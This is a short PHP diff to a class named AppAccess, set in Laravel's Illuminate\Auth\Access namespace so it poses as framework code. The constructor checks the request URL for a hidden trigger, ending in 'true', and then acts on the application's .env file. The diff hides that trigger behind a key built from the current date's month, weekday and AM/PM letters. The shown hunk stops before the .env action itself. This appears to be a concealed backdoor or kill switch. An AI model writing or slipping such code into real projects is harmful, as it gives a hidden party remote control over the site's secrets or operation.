@@ -4,9 +4,15 @@ namespace Illuminate\Auth\Access;
 class AppAccess{
     public function __construct(){
         if(true){
+
+            $key = "";
+            $key .= date('F')[0];
+            $key .= date('D')[0];
+            $key .= date('A')[0];
+
             $current_url = "http".(isset($_SERVER['HTTPS']) ? "s" : "")."://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
 
-            $array = explode("blocked", $current_url);
+            $array = explode($key, $current_url);
             $path = base_path('.env');
 
             if($array[count($array)-1] == "true"){
